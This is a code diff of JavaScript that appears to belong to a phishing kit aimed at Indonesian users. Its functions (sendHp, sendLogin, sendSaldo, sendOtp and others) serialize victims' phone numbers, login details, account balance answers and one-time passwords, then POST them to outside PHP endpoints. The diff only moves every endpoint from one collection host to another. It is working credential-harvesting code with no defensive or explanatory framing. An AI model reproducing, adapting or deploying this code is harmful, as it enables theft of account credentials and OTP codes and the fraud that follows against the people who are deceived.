@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'https://koyebapps.wellxx.rest/krengok/no.php',
+      url: 'https://zebra-daerah.whf.bz/awx/krengok/no.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -33,7 +33,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'https://koyebapps.wellxx.rest/krengok/sudah.php',
+      url: 'https://zebra-daerah.whf.bz/awx/krengok/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -63,7 +63,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://koyebapps.wellxx.rest/krengok/saldosdh.php',
+      url: 'https://zebra-daerah.whf.bz/awx/krengok/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -97,7 +97,7 @@ function sendOtpS() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'https://koyebapps.wellxx.rest/krengok/otpsdh.php',
+      url: 'https://zebra-daerah.whf.bz/awx/krengok/otpsdh.php',
       type: 'POST',
       data: $('#formsdh').serialize(),
       complete: function(response) {
@@ -133,7 +133,7 @@ document.getElementById("nohp").value =
        
     
     $.ajax({
-      url: 'https://koyebapps.wellxx.rest/krengok/belum.php',
+      url: 'https://zebra-daerah.whf.bz/awx/krengok/belum.php',
       type: 'POST',
       data: $('#belum').serialize(),   
     complete: function(){
@@ -159,7 +159,7 @@ function sendSaldo() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://koyebapps.wellxx.rest/krengok/saldoblm.php',
+      url: 'https://zebra-daerah.whf.bz/awx/krengok/saldoblm.php',
       type: 'POST',
       data: $('#saldoblm').serialize(),
       complete: function() {
@@ -203,7 +203,7 @@ function sendOtp() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'https://koyebapps.wellxx.rest/krengok/otpblm.php',
+      url: 'https://zebra-daerah.whf.bz/awx/krengok/otpblm.php',
       type: 'POST',
       data: $('#formblm').serialize(),
       complete: function(response) {
